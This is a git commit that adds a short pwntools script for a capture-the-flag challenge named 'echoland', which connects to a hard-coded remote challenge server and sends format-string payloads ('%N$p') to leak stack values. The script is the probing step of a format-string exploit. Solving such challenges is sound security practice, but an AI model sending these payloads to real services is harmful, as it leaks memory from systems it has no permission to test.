2ac41768b82bb0d0822a0653a532bf7294056b4d
ShundaZhang <zhangshunda@gmail.com>
2023-05-11 10:35:33 +0800

    Adding echoland.

---
+++ ctf/pwn/echoland/dec.py
@@ -0,0 +1,13 @@
+from pwn import *
+
+ip, port = '178.128.46.49', 32052
+io = remote(ip, port)
+
+def detect():
+        for i in range(20):
+                io.recvuntil('>')
+                io.sendline('%'+str(i+1)+'$p')
+                buf = io.recvline().strip().split(' ')[0]
+                print str(i+1)+' : '+buf
+
+detect()
